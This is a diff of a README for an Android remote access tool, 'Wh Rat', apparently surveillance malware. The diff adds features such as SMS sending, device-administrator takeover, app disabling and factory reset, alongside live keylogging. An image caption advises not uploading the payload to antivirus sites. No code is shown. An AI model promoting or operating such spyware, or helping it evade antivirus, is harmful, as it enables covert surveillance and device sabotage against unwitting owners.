@@ -18,9 +18,26 @@ Usage of WH-Cyberspace Hacking Tool for attacking targets without prior mutual c
 
 
 # About this item features
-[+] Uninstall app > ( New )_____________________ [+] self Uninstall > ( New )
 
-[+] Send Sms > ( New ) __________________________[+] Device administrator mode > ( New )
+# ----> Wh Rat V2.1 TO V2.4 New Updates features
+
+[+] Uninstall app > ( New )
+
+[+] self Uninstall > ( New )
+
+[+] Send Sms > ( New )
+
+[+] Device administrator mode > ( New )
+
+[+] Disable any App in Applications tab > ( New )
+
+[+] Enable App in Applications tab > ( New )
+
+[+]	Factory Data reset > ( New )
+
+
+
+# ----> WWh Rat V2.1 First Release features
 
 [+] Files Manager ____________________________[+] Live Key log
 
@@ -110,7 +127,12 @@ And Run
 [![IMAGE 1](https://github.com/wh-Cyberspace/Wh-Rat-V2/blob/main/img/img3.png)](https://www.youtube.com/channel/UCj6ekUzjItnjP6T7I9r1WMA?sub_confirmation=1 "Don't upload payload inbuilt Antivirus website")
 
 # ℹ INFO
-Framwork version : 2.2.0.1
+Framwork version : 2.4.1.0
+
+Release date : 10-10-2022
+
+latest Version Release date : 18-01-2023
+
 
 POWER BY >> WH-Cyberspace  
 
